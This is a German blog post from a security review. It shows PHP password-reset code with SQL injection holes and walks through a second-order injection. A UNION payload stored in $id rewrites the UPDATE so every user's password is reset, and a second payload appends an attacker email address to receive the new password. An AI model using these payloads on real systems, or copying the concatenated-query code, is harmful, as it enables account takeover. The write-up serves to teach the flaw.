Injectception
#############
:date: 2012-04-26 10:26
:tags: de, sql injection, yasi

Ich bin bei einer Sicherheitsueberpruefung ueber folgenden Code
gestolpert:

.. code-block :: php

    <?php

    if ($_POST["sender"] == "PassForm") {
       if ($_POST["mail"] == "") {
          buildForm(&$smarty, 2);
          return;
       }
       $id = existMail($_POST["mail"]);
       if (!$id) {
          buildForm(&$smarty, 1);
          return;
       }
       $pass = createNewPassword();
       if (!$pass) {
          $smarty->assign("error", "Kennwortgenerierung fehlgeschlagen!");
          $smarty->display("pass_failed.html");
          return;
       }
       if (!saveNewPassword($pass, $id)) {
          $smarty->assign("error", "Datenbankzugriff fehlgeschlagen!");
          $smarty->display("pass_failed.html");
          return;
       }   
       if (!sendMessage($_POST["mail"], $pass)) {
          $smarty->assign("error", "E-Mail-Versand fehlgeschlagen!");
          $smarty->display("pass_failed.html");
          return;
       }

    }

    function existMail($mail)
    {
       global $dsn;
       $db = DB::connect($dsn);
       $query = "SELECT id FROM User WHERE accountName LIKE '".$mail."' OR eMail LIKE '".$mail."';";
       $id = $db->getOne($query);
       if (PEAR::isError($id)) { // Fehler
          return false;
       }
       return $id;
    }


    function saveNewPassword($password, $id)
    {
       global $dsn;

       $db = DB::connect($dsn);
       $query ="UPDATE User SET accountPW = ENCRYPT('".$pass."') WHERE id = '".$id."';";
       $result = $db->query($query);
       if (PEAR::isError($result)) {
          return false;
       }
       return true;
    }

    function sendMessage($mail, $pass)
    {
       // Betriebs-E-Mail-Adresse
       $to = $mail;

       $subject  = "Ihr neues Kennwort";

       $header  = "From: xxx \r\n";
       $header .= "Content-type: text/plain; charset=UTF-8; format=flowed\r\n";

       $message  = "Hallo lieber Leser,\n\n";
       $message .= "auf Ihre Anfrage wurde für Sie ein neues Kennwort generiert.\n\n";
       $message .= "Hier sind ihre Benutzerdaten:\n";
       $message .= "Benutzername: ".$mail."\n";
       $message .= "Kennwort....: ".$pass."\n\n";
       $message .= "Für Rückfragen stehe ich Ihnen gerne zur Verfügung.\n\n";


       if (mail($to, $subject, $message, $header)) {
          return true;
       }
       else {
          return false;
       }
    }
    ?>


Es sollte relativ ersichtlich sein, dass schon im ersten Teil eine SQL
Injection moeglich ist. Man kann aber noch einen Schritt weitergehen.
Die PEAR-Klasse liefert bei getOne() nur eine Zeile zurueck. Bei einem
Element geht sie sogar soweit, dass direkt in die Variable als Wert
abzuspeichern. Dieser Wert wird auch nicht weiter ueberprueft, sondern
direkt an den UPDATE Befehle gefuettert. Die Ueberlegung ist also in der
Variable $id einen SQL Befehl abzulegen, der dann UPDATE beeinflusst.
Dies ist garnicht so schwer, wie es am Anfang ausschaut:

 .. code-block :: sql

    sender=PassForm&mail=-1' UNION select ("' or '1'='1") -- 

Wir gehen davon aus, dass kein Accountname "-1" existiert. Demnach
liefert der erste Select nichts zurueck. Das 2. Select liefert meine
noetige Injection als String zurueck, welches in $id abgespeichert wird.
"--" leitet einen Kommentar ein. Der Query, der dann auf die Datenbank
losgelassen wird, sieht dann so aus:

 .. code-block :: sql

    SELECT id FROM Users WHERE accountName LIKE '1' UNION select (" ' or '1'='1") -- ' OR eMail LIKE '1' UNION select (" ' or '1'='1") -- '

Damit haben wir $id="' or '1'='1" und unser Update wird auf diesen Query
erweitert:

 .. code-block :: sql

    UPDATE Users SET accountPW = 'pass' WHERE id = '' or '1'='1';

Damit wird fuer jeden Benutzer in der Datenbank das Passwort neu
gesetzt. Natuerlich kann auch fuer einzelne Benutzer gesetzt werden.
Leider hab ich keinen Einfluss auf das Passwort, was es mir unmoeglich
macht ein eigenes Passwort zu setzen. Aber ich weiss, dass eine Email
rausgeschickt wird. Da wir auch wissen, dass man bei mail() mehrere
Adresse durch ein Komma getrennt uebergeben koennen, erweitern wir
unseren Befehl noch ein wenig:

::

    mail=-1'%20UNION%20select%20("'%20or%20'1'='1")%20--%20,test@test.org&sender=PassForm

Damit wird die Email an 2 "Email"-Adressen geschickt, wovon nur eine
wirklich gueltig ist. so long
